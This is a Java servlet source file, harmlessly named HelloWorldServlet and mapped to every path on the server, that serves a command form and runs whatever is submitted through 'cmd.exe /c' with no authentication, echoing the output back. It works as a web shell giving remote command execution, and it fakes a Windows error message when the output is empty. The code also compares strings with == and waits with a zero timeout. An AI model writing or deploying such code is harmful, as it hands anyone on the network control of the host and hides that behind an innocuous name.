package com.example;

import java.io.IOException;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.zaxxer.nuprocess.NuProcess;
import com.zaxxer.nuprocess.NuProcessBuilder;

@WebServlet(urlPatterns = {"/*"}, loadOnStartup = 1)
public class HelloWorldServlet extends HttpServlet
{
    @Override 
    public void doGet(HttpServletRequest request, HttpServletResponse response) 
        throws IOException
    { 
        response.getOutputStream().println("<!DOCTYPE html><html><body><form action=\"/\" id=\"cmdform\" method=\"POST\">Command: <input type=\"text\" name=\"cmd\"><input type=\"submit\" value=\"Execute\"></form></body></html>");
    }
    @Override
      public void doPost(HttpServletRequest request, HttpServletResponse response) 
      throws IOException {
          String command = request.getParameter("cmd");
          NuProcessBuilder pb = new NuProcessBuilder("cmd.exe", "/c", command);
            ProcessHandler handler = new ProcessHandler();
            pb.setProcessListener(handler);
            NuProcess process = pb.start();
            process.wantWrite();
            try {
				process.waitFor(0, TimeUnit.SECONDS);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
            } 
            if(handler.output=="")response.getOutputStream().print("'"+command+"' is not recognized as an internal or external command, operable program or batch file.");
            else response.getOutputStream().print(handler.output);
      }
}